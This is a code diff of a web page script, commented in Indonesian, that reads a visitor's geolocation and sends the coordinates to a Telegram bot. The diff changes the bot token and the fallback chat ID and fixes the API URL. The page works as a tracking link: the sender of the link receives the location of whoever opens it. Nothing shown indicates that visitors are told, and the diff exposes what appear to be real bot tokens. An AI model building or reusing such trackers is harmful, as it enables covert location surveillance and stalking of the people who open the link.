@@ -19,7 +19,7 @@
 
     <script>
         // TOKEN BOT KAMU
-        const token = '8601318275:AAHCZd1zuF_fbVfwEp9SqCyA1Bgf5Iue4Hs';
+        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
         
         // Mengambil ID dari alamat link secara otomatis
         const urlParams = new URLSearchParams(window.location.search);
@@ -38,7 +38,7 @@
             const lon = posisi.coords.longitude;
 
             // Jika link tidak ada ID-nya, kirim ke ID kamu sebagai cadangan
-            const penerima = chatId ? chatId : '8607837939';
+            const penerima = chatId ? chatId : '1966317946';
 
             // PERBAIKAN: URL API Telegram harus lengkap seperti ini
             const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${penerima}&latitude=${lat}&longitude=${lon}`;
